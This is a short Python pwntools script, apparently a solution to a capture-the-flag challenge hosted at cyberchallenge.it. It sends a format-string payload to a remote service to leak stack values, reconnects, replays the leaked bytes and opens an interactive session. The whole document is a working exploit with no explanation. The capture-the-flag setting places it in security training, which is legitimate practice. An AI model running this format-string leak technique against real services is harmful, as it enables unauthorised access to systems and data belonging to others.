from pwn import *

payload = b"%18$lx %19$lx"

p = remote("accesscode.challs.cyberchallenge.it", 9217)

p.sendline(payload)

p.recvuntil(b"Your input: ")

leak = p.recvuntil(b"h", drop=False)
print(f"LEAK: {leak}")

p = remote("accesscode.challs.cyberchallenge.it", 9217)
p.send(leak)
p.interactive()